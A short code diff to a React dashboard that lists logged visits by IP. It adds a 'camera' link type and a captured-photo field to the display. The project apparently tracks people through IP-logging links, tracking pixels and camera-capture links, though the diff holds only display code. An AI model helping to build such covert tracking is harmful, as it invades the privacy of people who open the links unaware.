@@ -17,6 +17,8 @@ interface AccessData {
   referrer: string;
   type: 'link' | 'pixel';
   linkId?: string;
+  linkType?: 'ip' | 'camera';
+  photo?: string;
 }
 
 const Index = () => {
@@ -165,8 +167,12 @@ const Index = () => {
                     <div className="flex items-center space-x-2">
                       <Monitor className="h-4 w-4 text-gray-400" />
                       <span className="text-gray-300">
-                        {access.type === 'link' ? 'Link' : 'Pixel'} - {access.ip}
+                        {access.type === 'pixel' ? 'Pixel' : 
+                         access.linkType === 'camera' ? 'Câmera' : 'Link'} - {access.ip}
                       </span>
+                      {access.photo && (
+                        <span className="text-purple-400 text-xs">📸</span>
+                      )}
                     </div>
                     <span className="text-gray-500">
                       {new Date(access.timestamp).toLocaleTimeString()}
